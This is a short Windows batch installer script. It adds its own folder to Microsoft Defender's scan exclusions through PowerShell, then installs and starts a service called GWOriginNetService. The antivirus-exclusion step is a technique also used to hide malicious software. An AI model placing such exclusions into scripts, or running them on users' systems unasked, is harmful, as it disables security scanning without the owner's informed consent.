@echo off
%~d0
CD %~dp0
set mypath=%cd%
echo ---------------------------------------------
echo DO NOT CLOSE THIS WINDOW!
echo ---------------------------------------------
echo Adding installation path to exclude from Microsoft Defender Antivirus scans. Please wait...
start powershell -Command "Add-MpPreference -ExclusionPath '%mypath%'"



:END
echo ---------------------------------------------
start cmd /c "gworiginsv install && sc start GWOriginNetService"
timeout 3
exit